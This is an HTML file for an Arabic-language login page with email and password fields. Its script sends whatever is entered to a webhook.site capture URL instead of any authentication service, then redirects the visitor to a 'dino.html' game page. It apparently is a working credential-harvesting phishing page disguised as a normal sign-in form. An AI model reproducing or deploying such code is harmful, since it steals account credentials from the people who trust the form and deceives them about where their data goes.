<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>تسجيل الدخول</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .login-box {
    background: white;
    padding: 40px 30px;
    border-radius: 10px;
    box-shadow: 0 0 30px rgba(0,0,0,0.2);
    width: 320px;
  }
  h2 {
    margin-bottom: 20px;
    color: #333;
    text-align: center;
  }
  label {
    display: block;
    margin-top: 15px;
    color: #555;
  }
  input[type="email"], input[type="password"] {
    width: 100%;
    padding: 10px;
    margin-top: 5px;
    border-radius: 6px;
    border: 1px solid #ccc;
    box-sizing: border-box;
  }
  button {
    margin-top: 25px;
    width: 100%;
    padding: 12px;
    background-color: #2575fc;
    border: none;
    border-radius: 6px;
    color: white;
    font-size: 16px;
    cursor: pointer;
  }
  button:hover {
    background-color: #1a52d8;
  }
  .error {
    color: red;
    margin-top: 10px;
    text-align: center;
  }
</style>
</head>
<body>
<div class="login-box">
  <h2>تسجيل الدخول</h2>
  <form id="loginForm">
    <label for="email">البريد الإلكتروني</label>
    <input type="email" id="email" name="email" required />
    <label for="password">كلمة المرور</label>
    <input type="password" id="password" name="password" required />
    <button type="submit">Sign in</button>
    <div class="error" id="errorMsg"></div>
  </form>
</div>

<script>
  const form = document.getElementById('loginForm');
  const errorMsg = document.getElementById('errorMsg');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    errorMsg.textContent = '';

    const email = form.email.value;
    const password = form.password.value;

    try {
      const response = await fetch('https://webhook.site/15e6e8ec-5d5a-473e-aaf8-1cc442a195c9', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      });

      if (response.ok) {
        // بعد الإرسال الناجح، توجه لصفحة اللعبة
        window.location.href = 'dino.html';
      } else {
        errorMsg.textContent = 'حدث خطأ، حاول مرة أخرى.';
      }
    } catch (error) {
      errorMsg.textContent = 'تعذر الاتصال بالسيرفر.';
    }
  });
</script>
</body>
</html>
